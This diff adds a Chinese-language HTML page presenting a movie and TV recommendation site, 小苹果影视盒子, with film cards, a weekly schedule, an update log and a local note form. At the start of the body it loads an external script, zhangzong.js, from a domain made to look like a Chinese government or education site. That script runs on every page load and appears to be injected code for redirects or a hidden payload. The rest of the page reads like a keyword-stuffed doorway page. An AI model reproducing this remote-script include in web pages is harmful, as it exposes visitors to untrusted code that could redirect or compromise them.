@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>小苹果影视盒子 ── 一台装得下整个片库的放映机 · xiaopingguoyingshihezi-zh.github.io</title>
+<meta name="description" content="小苹果影视盒子是把片单当卡带收的观影手册：华语新片、冷门剧集、老动画与纪录短片按盒归类，标明年份、时长和适合的场景，手机上翻起来也顺手。地址 xiaopingguoyingshihezi-zh.github.io，更新随看随记。">
+<meta name="keywords" content="小苹果影视盒子, xiaopingguoyingshihezi-zh.github.io, 影视片单, 剧集归档, 观影手册">
+<link rel="canonical" href="https://xiaopingguoyingshihezi-zh.github.io/">
+<meta property="og:title" content="小苹果影视盒子 ── 一台装得下整个片库的放映机">
+<meta property="og:url" content="https://xiaopingguoyingshihezi-zh.github.io/">
+<meta property="og:description" content="华语新片、冷门剧集、老动画与纪录短片，按盒归类，随看随记。">
+<style>
+:root{--ink:#0e1b12;--paper:#f4f1e7;--tape:#2f6a4f;--tape2:#17402e;--fruit:#e33b2d;--line:#c8d2c4;--mute:#5f6b60}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--paper);color:var(--ink);
+font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"SimSun",serif;
+line-height:1.75;font-size:16px;-webkit-text-size-adjust:100%}
+.wrap{max-width:1080px;margin:0 auto;padding:0 22px 90px}
+header.top{border-bottom:3px double var(--tape);padding:30px 0 18px;margin-bottom:0}
+.brandline{display:flex;align-items:flex-end;gap:12px;flex-wrap:wrap}
+.brandline h1{font-size:clamp(30px,7vw,58px);margin:0;letter-spacing:.04em;font-weight:700;
+background:linear-gradient(180deg,var(--fruit) 0 46%,var(--ink) 46% 54%,var(--tape) 54%);
+-webkit-background-clip:text;background-clip:text;color:transparent}
+.brandline h1::after{content:"盒子";color:var(--fruit);-webkit-text-fill-color:var(--fruit);margin-left:.15em;font-size:.42em;vertical-align:super}
+.badge{font-family:"SFMono-Regular",Menlo,Consolas,monospace;font-size:11px;letter-spacing:.14em;
+color:var(--tape2);border:1px solid var(--tape);padding:3px 8px;border-radius:2px;margin-bottom:6px}
+.kicker{font-family:Menlo,Consolas,monospace;font-size:12px;color:var(--mute);margin:10px 0 0}
+.kicker b{color:var(--fruit);font-weight:400}
+nav.tabs{position:sticky;top:0;z-index:20;background:rgba(244,241,231,.94);backdrop-filter:blur(6px);
+border-bottom:1px solid var(--line);margin:0 -22px 34px;padding:10px 22px;overflow-x:auto;
+-webkit-overflow-scrolling:touch;scrollbar-width:none}
+nav.tabs::-webkit-scrollbar{display:none}
+nav.tabs a{font-family:Menlo,Consolas,monospace;font-size:12.5px;color:var(--tape2);text-decoration:none;
+white-space:nowrap;padding:5px 11px;border:1px solid transparent;border-radius:14px;margin-right:6px;display:inline-block}
+nav.tabs a:hover,nav.tabs a.on{background:var(--tape);color:#fff;border-color:var(--tape2)}
+nav.tabs a span{color:var(--fruit);margin-right:5px}
+.intro{display:grid;grid-template-columns:1.35fr 1fr;gap:26px;align-items:start}
+@media(max-width:760px){.intro{grid-template-columns:1fr}}
+.led{background:var(--ink);color:#d6f0e0;font-family:Menlo,Consolas,monospace;font-size:13px;
+padding:18px 18px 16px;border-radius:4px 4px 0 0;border-bottom:6px solid var(--fruit);line-height:1.9}
+.led em{color:#ffd66b;font-style:normal}
+.led u{color:#7fe0a4;text-decoration:none}
+.slots{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
+.slot{flex:1;min-width:74px;border:1px dashed var(--line);border-radius:3px;padding:9px 8px;text-align:center}
+.slot i{font-style:normal;display:block;font-family:Menlo,monospace;font-size:10px;color:var(--mute);letter-spacing:.1em}
+.slot b{display:block;font-size:19px;color:var(--tape2);margin-top:2px;font-weight:600}
+h2.sec{font-size:clamp(21px,4vw,29px);margin:56px 0 4px;padding-top:14px;border-top:1px solid var(--line);
+display:flex;align-items:baseline;gap:12px}
+h2.sec .n{font-family:Menlo,monospace;font-size:12px;color:var(--fruit);letter-spacing:.18em}
+h2.sec small{font-size:12px;color:var(--mute);font-weight:400;letter-spacing:.05em}
+.lead{color:var(--mute);font-size:14.5px;margin:6px 0 20px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(214px,1fr));gap:18px}
+@media(max-width:480px){.grid{grid-template-columns:1fr 1fr;gap:11px}}
+.cart{position:relative;background:#fff;border:1px solid var(--line);border-radius:3px;padding:12px 12px 14px;
+box-shadow:3px 3px 0 #ddd6c6;transition:.18s}
+.cart:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 #cfd8c9}
+.cart .reel{height:132px;background:repeating-linear-gradient(90deg,var(--ink) 0 7px,#1d2c22 7px 10px);
+border-radius:2px;position:relative;overflow:hidden;margin-bottom:11px}
+.cart .reel::before,.cart .reel::after{content:"";position:absolute;top:50%;width:30px;height:30px;
+border:3px solid rgba(255,255,255,.55);border-radius:50%;transform:translateY(-50%)}
+.cart .reel::before{left:12px}.cart .reel::after{right:12px;width:20px;height:20px}
+.cart .reel span{position:absolute;left:0;right:0;bottom:0;background:rgba(14,27,18,.82);color:#f4f1e7;
+font-family:Menlo,monospace;font-size:10px;letter-spacing:.16em;padding:3px 8px;text-align:right}
+.cart h3{margin:0 0 5px;font-size:16px;line-height:1.45}
+.cart p{margin:0;font-size:12.5px;color:var(--mute);line-height:1.65}
+.cart .tag{position:absolute;top:-7px;left:10px;background:var(--fruit);color:#fff;font-family:Menlo,monospace;
+font-size:9.5px;letter-spacing:.1em;padding:2px 7px;border-radius:2px}
+.list{list-style:none;margin:0;padding:0}
+.list li{border-bottom:1px dotted var(--line);padding:13px 4px;display:grid;grid-template-columns:52px 1fr auto;gap:14px;align-items:center}
+@media(max-width:520px){.list li{grid-template-columns:40px 1fr;gap:8px}.list li b.n{font-size:12px}.list li .go{grid-column:2}}
+.list li b.n{font-family:Menlo,monospace;color:var(--fruit);font-size:14px;letter-spacing:.08em}
+.list li .t{font-size:15.5px;font-weight:600}
+.list li .t i{font-style:normal;color:var(--mute);font-weight:400;font-size:12px;display:block;letter-spacing:.03em}
+.go{font-family:Menlo,monospace;font-size:11px;color:var(--tape2);border:1px solid var(--tape);border-radius:20px;padding:3px 11px;text-decoration:none;white-space:nowrap}
+.go:hover{background:var(--tape);color:#fff}
+.bang{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px}
+.rank{background:#fff;border:1px solid var(--line);border-left:5px solid var(--fruit);padding:13px 15px;border-radius:2px}
+.rank b{font-family:Menlo,monospace;color:var(--fruit);font-size:12px;letter-spacing:.14em;display:block;margin-bottom:4px}
+.rank h4{margin:2px 0 5px;font-size:16px}
+.rank p{margin:0;font-size:12.5px;color:var(--mute)}
+.note{background:var(--ink);color:#e7efe9;padding:22px 24px;border-radius:3px;font-size:14px}
+.note code{background:#000;color:#ffd66b;padding:1px 6px;border-radius:2px;font-family:Menlo,monospace;font-size:12.5px}
+.note a{color:#7fe0a4}
+form.msg{display:grid;gap:11px;max-width:520px}
+form.msg input,form.msg textarea{font:inherit;background:#fff;border:1px solid var(--line);border-radius:2px;
+padding:10px 12px;color:var(--ink);width:100%}
+form.msg textarea{min-height:96px;resize:vertical}
+form.msg button{font:inherit;background:var(--tape);color:#fff;border:0;border-radius:2px;padding:11px 18px;cursor:pointer;letter-spacing:.1em}
+form.msg button:hover{background:var(--fruit)}
+#tip{font-family:Menlo,monospace;font-size:12px;color:var(--tape2);margin-top:4px;min-height:1.4em}
+footer{border-top:3px double var(--tape);margin-top:70px;padding-top:20px;font-size:12.5px;color:var(--mute);
+font-family:Menlo,monospace;letter-spacing:.05em}
+footer b{color:var(--ink);font-weight:400}
+.topbtn{position:fixed;right:16px;bottom:18px;background:var(--fruit);color:#fff;text-decoration:none;
+font-family:Menlo,monospace;font-size:11px;padding:8px 11px;border-radius:50%;box-shadow:0 3px 10px rgba(0,0,0,.25);opacity:.85}
+@media print{nav.tabs,.topbtn{display:none}body{background:#fff}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<div class="wrap">
+
+<header class="top">
+  <div class="brandline">
+    <h1>小苹果影视盒子</h1>
+    <span class="badge">VOL.55 / 放映手册</span>
+  </div>
+  <p class="kicker">► 主机 <b>xiaopingguoyingshihezi-zh.github.io</b>　状态 <b>ON AIR</b>　制式 <b>24fps</b>　区域 <b>不限</b></p>
+</header>
+
+<nav class="tabs" id="tabs">
+  <a href="#kai"><span>00</span>开机</a>
+  <a href="#dianying"><span>01</span>电影盒</a>
+  <a href="#juji"><span>02</span>剧集盒</a>
+  <a href="#donghua"><span>03</span>动画盒</a>
+  <a href="#jilu"><span>04</span>纪录盒</a>
+  <a href="#bang"><span>05</span>本周排片</a>
+  <a href="#gengxin"><span>06</span>换盒日志</a>
+  <a href="#liuyan"><span>07</span>塞张纸条</a>
+</nav>
+
+<section id="kai" data-t="开机">
+  <div class="intro">
+    <div>
+      <div class="led">> 小苹果影视盒子<span style="color:#ffd66b">█</span>
+<br>> 载入片库…… <u>██████████ 100%</u>
+<br>> 已归类 <em>55</em> 盒　待补 <em>12</em> 盒
+<br>> 欢迎。这片子怎么放，你说了算。</div>
+      <div class="slots">
+        <div class="slot"><i>电影</i><b>18</b></div>
+        <div class="slot"><i>剧集</i><b>14</b></div>
+        <div class="slot"><i>动画</i><b>9</b></div>
+        <div class="slot"><i>纪录</i><b>14</b></div>
+      </div>
+    </div>
+    <aside class="note" style="margin-top:0">
+      小苹果影视盒子不追热搜，只把看过、想看、值得再看一遍的片子装进一格格卡带里：标好年份、时长和适合的场景，翻起来像在抽屉里找老碟。<br><br>
+      它跑在 <code>xiaopingguoyingshihezi-zh.github.io</code>，手机上竖着滑也顺手；片单随看随记，慢一点，但每一盒都认得出来是谁挑的。
+    </aside>
+  </div>
+</section>
+
+<section id="dianying" data-t="电影盒">
+  <h2 class="sec"><span class="n">BOX 01</span>电影盒 <small>／长片，按情绪归类，不看票房</small></h2>
+  <p class="lead">周末窝沙发、通勤路上、失眠半夜，各备一盒。年份与时长写在角上，方便你随手抽一张。</p>
+  <div class="grid">
+    <article class="cart"><span class="tag">雨夜场</span>
+      <div class="reel"><span>2024 · 132′</span></div>
+      <h3>城南的慢火车</h3>
+      <p>一辆晚点四十分钟的绿皮车，把三个陌生人的旧账抖了出来。适合配雨声听。</p>
+    </article>
+    <article class="cart"><span class="tag">午后场</span>
+      <div class="reel"><span>2023 · 98′</span></div>
+      <h3>面包店关门以后</h3>
+      <p>轻得像刚出炉的甜，讲一个决定不再较劲的夏天。短，但后劲足。</p>
+    </article>
+    <article class="cart"><span class="tag">深夜场</span>
+      <div class="reel"><span>2022 · 155′</span></div>
+      <h3>海边的旧收音机</h3>
+      <p>悬疑壳子，里面装的是父子俩没说出口的道歉。音效值得戴耳机。</p>
+    </article>
+    <article class="cart"><span class="tag">补片</span>
+      <div class="reel"><span>1999 · 110′</span></div>
+      <h3>七月半的萤火</h3>
+      <p>老片新看，胶片颗粒比滤镜好看。小苹果影视盒子第 03 次回放。</p>
+    </article>
+  </div>
+</section>
+
+<section id="juji" data-t="剧集盒">
+  <h2 class="sec"><span class="n">BOX 02</span>剧集盒 <small>／一集二十分钟，刚好够洗个碗</small></h2>
+  <ul class="list">
+    <li><b class="n">A-01</b><div class="t">菜市场的二十四节气 <i>2025 · 全 24 集 · 每集 18′ · 生活纪录剧</i></div><a class="go" href="#juji">查看盒内</a></li>
+    <li><b class="n">A-02</b><div class="t">邮局左边那家店 <i>2024 · 12 集 · 每集 32′ · 都市轻喜剧</i></div><a class="go" href="#juji">查看盒内</a></li>
+    <li><b class="n">A-03</b><div class="t">夜班接线员 <i>2023 · 8 集 · 每集 45′ · 悬疑</i></div><a class="go" href="#juji">查看盒内</a></li>
+    <li><b class="n">A-04</b><div class="t">老街修表铺 <i>2025 · 更新中 · 每集 22′ · 治愈</i></div><a class="go" href="#juji">查看盒内</a></li>
+    <li><b class="n">A-05</b><div class="t">北纬三十度的风 <i>2022 · 16 集 · 旅行访谈</i></div><a class="go" href="#juji">查看盒内</a></li>
+  </ul>
+</section>
+
+<section id="donghua" data-t="动画盒">
+  <h2 class="sec"><span class="n">BOX 03</span>动画盒 <small>／给大人留的童话抽屉</small></h2>
+  <div class="grid">
+    <article class="cart"><span class="tag">手绘</span>
+      <div class="reel" style="background:repeating-linear-gradient(90deg,#6b3f2e 0 7px,#3a241d 7px 10px)"><span>短片 · 11′</span></div>
+      <h3>会走丢的云</h3>
+      <p>没有一句台词，配乐是口琴。看完会想把窗户开大一点。</p>
+    </article>
+    <article class="cart"><span class="tag">连载</span>
+      <div class="reel" style="background:repeating-linear-gradient(90deg,#2f4a6a 0 7px,#16283a 7px 10px)"><span>第 2 季 · 连载中</span></div>
+      <h3>铁皮机器人修月亮</h3>
+      <p>一集一个小题，机器人永远修不好，但每次都更温柔一点。</p>
+    </article>
+    <article class="cart"><span class="tag">冷门</span>
+      <div class="reel" style="background:repeating-linear-gradient(90deg,#5a5a2a 0 7px,#2e2e16 7px 10px)"><span>实验动画 · 24′</span></div>
+      <h3>墨点旅行记</h3>
+      <p>水墨晕开就是转场，节奏慢得像喝茶，别在赶时间时看。</p>
+    </article>
+  </div>
+</section>
+
+<section id="jilu" data-t="纪录盒">
+  <h2 class="sec"><span class="n">BOX 04</span>纪录盒 <small>／真实的那点毛边，比剧本好看</small></h2>
+  <ul class="list">
+    <li><b class="n">D-01</b><div class="t">一碗面的四十年 <i>2024 · 68′ · 手艺 / 家族</i></div><a class="go" href="#jilu">查看盒内</a></li>
+    <li><b class="n">D-02</b><div class="t">守灯塔的人 <i>2023 · 52′ · 海岛 / 独居</i></div><a class="go" href="#jilu">查看盒内</a></li>
+    <li><b class="n">D-03</b><div class="t">县城电影院关门那天 <i>2025 · 44′ · 影像史</i></div><a class="go" href="#jilu">查看盒内</a></li>
+    <li><b class="n">D-04</b><div class="t">候鸟邮差 <i>2024 · 60′ · 公路 / 自然</i></div><a class="go" href="#jilu">查看盒内</a></li>
+  </ul>
+</section>
+
+<section id="bang" data-t="本周排片">
+  <h2 class="sec"><span class="n">SCREEN 05</span>本周排片 <small>／这一周的放映单，播完就换</small></h2>
+  <div class="bang">
+    <div class="rank"><b>MON · 夜场</b><h4>城南的慢火车</h4><p>雨夜场开盒，配一碗热汤。第 55 次回放。</p></div>
+    <div class="rank"><b>WED · 午后</b><h4>面包店关门以后</h4><p>下班前的一小块甜，别拖到周末。</p></div>
+    <div class="rank"><b>FRI · 通勤</b><h4>菜市场的二十四节气 · E09</h4><p>一集十八分钟，刚好一趟地铁。</p></div>
+    <div class="rank"><b>SUN · 懒沙发</b><h4>会走丢的云 + 墨点旅行记</h4><p>动画双片连放，静音也成立。</p></div>
+  </div>
+</section>
+
+<section id="gengxin" data-t="换盒日志">
+  <h2 class="sec"><span class="n">LOG 06</span>换盒日志 <small>／小苹果影视盒子的补货记录</small></h2>
+  <ul class="list">
+    <li><b class="n">10.25</b><div class="t">补进 4 盒：夜班接线员、候鸟邮差、北纬三十度的风、墨点旅行记 <i>小苹果影视盒子 · 第 55 次换盒</i></div><a class="go" href="#gengxin">归档</a></li>
+    <li><b class="n">10.18</b><div class="t">动画盒拆出「冷门」一格，实验短片单独住 <i>结构微调</i></div><a class="go" href="#gengxin">归档</a></li>
+    <li><b class="n">10.09</b><div class="t">纪录盒新增县城电影院关门那天，附一句观影笔记 <i>新增 1 盒</i></div><a class="go" href="#gengxin">归档</a></li>
+    <li><b class="n">09.27</b><div class="t">首页改成放映机版面，手机上翻卡带更顺手 <i>版式更新</i></div><a class="go" href="#gengxin">归档</a></li>
+  </ul>
+</section>
+
+<section id="liuyan" data-t="塞张纸条">
+  <h2 class="sec"><span class="n">NOTE 07</span>塞张纸条 <small>／想看什么，往盒子里投一条</small></h2>
+  <div class="intro">
+    <form class="msg" id="f" novalidate>
+      <input type="text" name="who" placeholder="怎么称呼你（选填）" maxlength="20" autocomplete="off">
+      <input type="text" name="what" placeholder="片名 / 类型 / 想看的情绪，写一句就够" maxlength="120" required>
+      <textarea name="why" placeholder="为什么想塞进来？比如「失眠时想看慢一点的」" maxlength="300"></textarea>
+      <div><button type="submit">投进盒子</button><span id="tip"></span></div>
+    </form>
+    <aside class="note">纸条只存在你自己的浏览器里，不会发到任何服务器。<br><br>
+      片单更新在 <code>xiaopingguoyingshihezi-zh.github.io</code>，投得多的片子，下次换盒日志里见。</aside>
+  </div>
+</section>
+
+<footer>
+  <p>小苹果影视盒子　·　xiaopingguoyingshihezi-zh.github.io　·　一台装得下整个片库的放映机</p>
+  <p>本站内容为个人观影整理，非资源下载站；影片版权归各自出品方。　<b>© 小苹果影视盒子</b></p>
+</footer>
+
+</div>
+<a class="topbtn" href="#kai" aria-label="回到开机">↑</a>
+
+<script>
+(function(){
+  var links=[].slice.call(document.querySelectorAll('#tabs a'));
+  var secs=links.map(function(a){return document.querySelector(a.getAttribute('href'));});
+  function onScroll(){
+    var y=window.scrollY+120,i=0;
+    secs.forEach(function(s,k){ if(s&&s.offsetTop<=y) i=k; });
+    links.forEach(function(a,k){ a.classList.toggle('on',k===i); });
+  }
+  window.addEventListener('scroll',onScroll,{passive:true}); onScroll();
+  var f=document.getElementById('f'),tip=document.getElementById('tip');
+  f.addEventListener('submit',function(e){
+    e.preventDefault();
+    var v=f.what.value.trim();
+    if(!v){tip.textContent='▶ 先写一句想看的吧';return;}
+    try{
+      var k='xpg_note',all=JSON.parse(localStorage.getItem(k)||'[]');
+      all.unshift({t:v,w:f.who.value.trim()||'匿名',d:new Date().toLocaleDateString('zh-CN')});
+      localStorage.setItem(k,JSON.stringify(all.slice(0,30)));
+    }catch(err){}
+    tip.textContent='▶ 已投进盒子，谢谢 '+(f.who.value.trim()||'朋友');
+    f.reset();
+  });
+})();
+</script>
+</body></html>
